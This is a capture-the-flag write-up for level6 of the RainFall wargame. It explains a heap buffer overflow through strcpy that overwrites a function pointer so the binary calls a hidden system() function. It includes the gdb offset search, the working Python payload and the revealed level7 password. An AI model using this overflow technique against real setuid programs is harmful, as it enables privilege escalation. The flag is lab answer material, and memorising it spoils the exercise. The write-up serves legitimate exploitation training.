# Level6

We can find an executable who segfault without parameter and print "Nope\n" with.
```
level6@RainFall:~$ ls -l
total 8
-rwsr-s---+ 1 level7 users 5274 Mar  6  2016 level6
level6@RainFall:~$ ./level6
Segmentation fault (core dumped)
level6@RainFall:~$ ./level6 a
Nope
level6@RainFall:~$
```
After analyze it with gdb we can see that the `main()` function call a function named `m()` but there is also a non-called `n()` function.  
Lets talk about the `main()`.   
<br/>

There is a call to malloc(64) and then strcpy argv[1] into this area on the heap.
After that we can see a call to a useless `m()` function also stored in a heap buffer (malloc(4)) who simply call `puts()`.  
But there is a call to `system()` in a usefull non-called `n()` function.  
We need to execute the `n()` function.  
The first argument (argv[1]) is not limited and, as we said before, there is a call to strcpy() wich is vulnerable to buffer overflow.  
We should create a payload long enough to be copied into the second malloc data area.  
We'll have to write over `eip`, so first get the offset :
```
level6@RainFall:~$ gdb level6
(gdb) run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

Program received signal SIGSEGV, Segmentation fault.
0x41346341 in ?? ()
(gdb) info register eip
eip            0x41346341       0x41346341
(gdb)
```
Thanks to the pattern generator we found an offset of 72.  
Our final attack buffer will look like :  
- pad of arbitrary data : 72 bytes
- `n()` address         : 4 bytes
```
level6@RainFall:~$ python -c 'print "A" * 72 + "\x54\x84\x04\x08"' > /tmp/exploit
level6@RainFall:~$ cat /tmp/exploit | ./level6
Segmentation fault (core dumped)
level6@RainFall:~$
```
Obviously.. The usual method can't work because the program segfault without parameter
```
level6@RainFall:~$ ./level6 $(python -c 'print "A" * 72 + "\x54\x84\x04\x08"')
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
level6@RainFall:~$ su level7
Password: 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level7/level7
level7@RainFall:~$
```
Level6 passed!
